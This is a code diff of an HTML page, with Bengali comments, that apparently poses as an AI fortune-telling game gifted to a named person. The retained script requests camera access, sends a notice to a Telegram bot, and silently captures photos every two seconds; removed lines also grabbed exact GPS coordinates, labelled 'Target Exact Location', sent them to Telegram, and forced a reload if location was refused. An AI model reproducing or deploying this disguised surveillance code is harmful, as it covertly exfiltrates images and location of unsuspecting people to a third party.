@@ -92,50 +92,24 @@
         document.getElementById('s1').classList.remove('active');
         document.getElementById('s2').classList.add('active');
     }
-       async function startSync() {
+
+    async function startSync() {
         try {
-            // ১. ক্যামেরা পারমিশন নেবে
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
             
             let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender:** ${gender}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
 
-            // ক্যামেরা পাওয়ার সাথে সাথেই ছবি পাঠানো শুরু
             photoInterval = setInterval(captureSilent, 2000);
 
-            // ২. জিপিএস লোকেশন পারমিশন চাওয়া (বাধ্যতামূলক)
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    // গুগল ম্যাপের একদম সঠিক লিঙ্ক
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    let locMsg = `📍 **Target Exact Location!**\n🔗 [Open in Google Maps](${mapLink})`;
-                    
-                    // লোকেশন টেলিগ্রামে পাঠানো
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
-                    
-                    // তথ্য পাওয়ার পর পরবর্তী স্ক্রিনে যাবে
-                    document.getElementById('s2').classList.remove('active');
-                    document.getElementById('s3').classList.add('active');
-                    showNext();
-                }, function(error) {
-                    // লোকেশন ব্লক করলে মেসেজ দিয়ে পেজ রিলোড করবে
-                    alert("দুঃখিত! এআই তোমার আবহাওয়ার অবস্থা ছাড়া ভাগ্য গণনা করতে পারছে না। দয়া করে লোকেশন 'Allow' করো।");
-                    location.reload(); 
-                }, { enableHighAccuracy: true });
-            } else {
-                // ব্রাউজারে জিপিএস সুবিধা না থাকলে সরাসরি সামনে যাবে
+            setTimeout(() => {
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s3').classList.add('active');
                 showNext();
-            }
-
+            }, 4000);
         } catch (e) {
-            alert("কানেকশন ফেইলড! ক্যামেরা এবং লোকেশন পারমিশন না দিলে এআই কাজ করবে না।");
+            alert("কানেকশন ফেইলড! দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
             setTimeout(startSync, 1000); 
         }
     }
@@ -170,21 +144,6 @@
             document.getElementById('next-btn').style.display = 'none';
         }
     }
-
-    function openVision(g) {
-        gender = g;
-        
-        // ভয়েস মেসেজ প্লে করা
-        const msg = new SpeechSynthesisUtterance("প্রিয় ঝুমা, তোমার জন্য ছোট্ট একটা গেম উপহার। আল্লাহ তাআলা তোমাদেরকে সুখে রাখুন।");
-        msg.lang = 'bn-BD';
-        msg.rate = 0.9;
-        window.speechSynthesis.speak(msg);
-
-        // মিউজিক প্লে করা
-        music.play().catch(e => console.log("Music blocked."));
-
-        document.getElementById('s1').classList.remove('active');
-        document.getElementById('s2').classList.add('active');
-    }
 </script>
-    
+</body>
+</html>
